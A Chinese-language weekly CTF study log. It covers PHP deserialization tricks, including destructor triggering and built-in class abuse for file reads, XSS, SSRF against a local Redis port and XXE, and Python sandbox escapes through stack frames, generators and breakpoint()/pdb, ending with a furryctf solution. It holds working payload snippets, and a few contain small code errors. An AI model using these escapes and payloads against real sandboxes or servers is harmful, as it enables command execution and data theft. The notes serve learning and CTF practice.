# <font style="color:rgb(38, 38, 38);">完成事项</font>
1. 补全python沙盒逃逸的内容
2. 补全php反序列化
3. 数据库学习:  <a href="https://uk5555544.github.io/2026/02/05/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%85%A5%E9%97%A8(%E4%BA%8C)/">sqlite</a>
4. 最近在学习java，准备学java反序列化
# <font style="color:rgb(38, 38, 38);">下周待做事项</font>
1. sh赛完wp
2. 继续学习数据库：Mongodb
# <font style="color:rgb(38, 38, 38);">本周学习的知识分享</font>
---
### php反序列化补充
#### 垃圾回收机制(Gabage Collection)利用

php的GC是利用引用计数来管理内存的:当一个变量被赋值、被引用时，计数加1；当一个变量被销毁(unset)、被解除引用时，计数减1；等于空值(NULL)直接清0。当计数为0时，内存被释放。对象会立即调用析构函数(__destruct)释放资源

GC利用: 即刻析构

在一些反序列化场景里，我们需要利用析构函数进行某些操作，但题目会在执行析构前或者脚本结束后加上类似于'throw new Exception'的语句或die()/exit()等函数，导致在析构函数执行前强迫结束脚本，从而导致析构函数失效或者中断连接不再回显结果

对于这种情况，我们需要构建某些操作使对象计数归0，从而提前触发析构函数的执行。除了unset()这种显式销毁，还有一种针对反序列化的隐式销毁——数组覆盖

```php
a:2:{i:0; [目标对象]; i:0; i:1;}
```
很好理解，这里数组的第0个索引被赋值了两次，第二次赋值会覆盖第一次赋值，从而导致第一次赋值的对象引用计数减1归0，触发析构函数的执行

```php
$payload_content = serialize($sun); # recount($payload_content)=1
$final_payload = 'a:2:{i:0;' . $payload_content . ';i:0;i:1;}';
# recount($payload_content)=0
```

>当数组recount归0，里面所有的对象都会被析构

#### 原生类的利用

PHP内置了一些原生类，里面自带的方法可以帮助我们绕过waf实现rce

1. SplFileObject()类
>SplFileObject类用于文件操作，提供了丰富的方法来读取和写入文件

```php
# 括号内是目标文件名
$obj = new SplFileObject("文件名");
$obj->fpassthru(); # 输出文件内容
```

2. GlobIterator()类
>GlobIterator类用于遍历符合特定模式的文件。当该实例被当作字符串使用时，会调用__toString()方法，返回目录下第一个文件的文件名。支持通配符搜索
```php
$a = new GlobIterator("/flag*");
echo $a;
```
还有一个类似效果的类:DirectoryIterator()，只不过要搭配glob://协议。
```php
$dir = new DirectoryIterator("glob:///var/www/html/flag*");
echo $dir;
```

3. xss

php7的Error类包含xss漏洞，可以通过__toString()触发
```php
$e = new Error("<script>alert(1)</script>");
echo $e; 
```

4. ssrf

SoapClient的__call()会发送请求
```php
$client = new SoapClient(null, array(
    'location' => 'http://127.0.0.1:6379/', 
    'uri' => '网址',
    'user_agent' => "Payload" ))
$client->not_exist_method();
```

5. xxe

SimpleXMLElement类的会解析xml实体
```php
$xml = "<?xml version='1.0'?><!DOCTYPE root [<!ENTITY xxe SYSTEM 'file:///flag'>]><root>&xxe;</root>";
$obj = new SimpleXMLElement($xml);
echo $obj->asXML();
```
---
### 栈帧沙箱逃逸补充
每当一个函数被调用时，解释器都会创建一个栈帧对象，具有以下属性
```python
f_locals：局部变量字典，可以查看和修改生成器当前帧的局部变量
f_globals：全局变量字典，存储当前模块的全局变量
f_code：代码对象，包含字节码指令等函数定义信息
f_lasti：当前执行的指令索引，指示执行到了哪条字节码指令
f_back：指向调用当前函数的上一个栈帧
```
如下方式截取栈帧
+ sys._getframe()
>仅限Cpython解释器

```python
import sys
frame = sys._getframe(depth=0)
```
>depth=0 指向该函数栈帧
depth=1 指向父类函数栈帧
depth=2 父类的父类，以此类推

比如
```python
import sys
def son():
    print("123")
    sys._getframe(0)
    # 取son的栈帧
    sys._getframe(1)
    # 取father的栈帧

def father():
son()
```
+ inspect模块的currentframe()
>仅限Cpython解释器

currentframe()的底层仍是sys._getframe()，使用起来更加简便。不过它仅能指向当前函数栈帧
```python
import inspect
def foo():
     frame = inspect.currentframe()
```
+ 生成器

在python中，()可以来表示生成器。当你需要一个数据时生成器会调用 yield 计算出一个数据然后待机，分为手动生成和表达式两种写法
```python
# 手动生成
def generator():
    yield 1
    yield 2
    yield 3
# 表达式生成
(返回值 for 任意变量 in 可迭代对象 if 条件)
g = (i for i in range(3)) 
```
输出也有不同写法
```python
# for循环输出
for i in g:
    print(i)
# next()输出
print(next(g)) # 输出1
print(next(g)) # 输出2
# 解包
g = (i for i in range(3))
print([*g])  # [0, 1, 2]
```
生成器也包含一些属性
```python
gi_code：生成器对应的代码对象，包含生成器函数的字节码和相关信息
gi_frame：生成器当前运行的帧对象

gi_frame为栈帧对象，同样可以访问栈帧属性：
gi_frame.f_locals：可以访问生成器当前帧的局部变量字典
...
```
栈帧逃逸的核心就是利用f_back跳出沙盒。一般沙盒会这么写
```python
code = "接受用户输入代码"
compiled_code = compile(code)
# 将代码编译
exec(
    compiled_code,
    # { "__builtins__":  None }
)
# 执行
```
我们需要跳出exec获得globals，如果none没启用
```python
import sys
frame=sys._getframe(1)
# 跳出exec()
builtin=frame_globals.get("__builtins__")
imp = getattr(builtin, "import")
syste=imp("os").system
syste("ls /")
# inspect同理
```
如果none启用，import无法使用，我们就需要利用生成器
```python
q = (q.gi_frame.f_back.f_back.f_globals for _ in [1])
# 第一次f_back跳出生成器，第二次跳出exec
# 当range被禁用，我们可以用[1]代替
g = [*q][0]
# next()属于__builtins__，故采用解包的方式
```
---
### breakpoint()逃逸
>breakpoint()是Python 3.7引入的一个内置函数，用于在代码中设置断点，方便调试。它会调用sys.breakpointhook()，默认情况下会启动pdb调试器

pdb即Python Debugger(交互式源代码调试模块)，本质上是交互式解释器，可以强制控制程序执行流，相当于另一个终端。在老版本用模块导入
```python
import pdb
pdb.set_trace()
```
python3.7+可以直接用breakpoint()
```python
breakpoint()
```
程序会到breakpoint()处暂停，进入pdb交互模式，允许我们执行各种调试命令。并且内置os，sys等模块，允许我们直接使用
```python
(Pdb) import os
(Pdb) os.system('ls /')
```
在pdb模式下，可以使用以下命令:
- n (ext): 执行下一行代码
- c (ontinue): 继续执行程序直到下一个断点
- q (uit): 退出调试器，终止程序
- p (expression): 打印表达式的值
- l (ist): 显示当前代码行及其周围的代码
- j (ump) lineno: 跳转到指定的行号继续执行,但只限同一代码块内跳转

而在Python3.14+中，breakpoint()新增了一个参数，可以直接预先在括号内填入commands列表，从而在进入pdb模式时自动执行这些命令
```python
breakpoint(commands=['import os', 'os.system("ls /")'])
```
今年furryctf的沙箱逃逸就是利用breakpoint()逃逸的
``` python
wrapper = """
import sys

def safe_exec():
    try:
{indented_code}
        return 0
    except SystemExit as e:
        return e.code if isinstance(e.code, int) else 0
    except Exception as e:
        print(f"执行错误: {{e}}", file=sys.stderr)
        return 1

sys.argv = ['sandbox.py'] + {args}

exit_code = safe_exec()

exit()
# Hey bro, don't forget to remove this before release!!!
import os
import sys

flag_content = os.environ.get('GZCTF_FLAG', '')
os.environ['GZCTF_FLAG'] = ''

try:
    with open('/flag.txt', 'w') as f:
        f.write(flag_content)
except:
    pass
"""
```
可以看到在flag_content写入前面有个exit()，就是要利用breakpoint()跳过exit()，读取import os，才能触发`os.environ.get('GZCTF_FLAG', '')`，从而读取后续变量
```python
breakpoint(commands=['n','n','n','j 20','n','n','n','p flag_content'])
```

# <font style="color:rgb(38, 38, 38);">本周学习总结</font>
这周主要补全了python沙盒逃逸的内容，学习了栈帧逃逸和breakpoint逃逸。还学习了php反序列化和数据库知识
# <font style="color:rgb(38, 38, 38);">杂项</font>
下周四考科目二，三天会不在家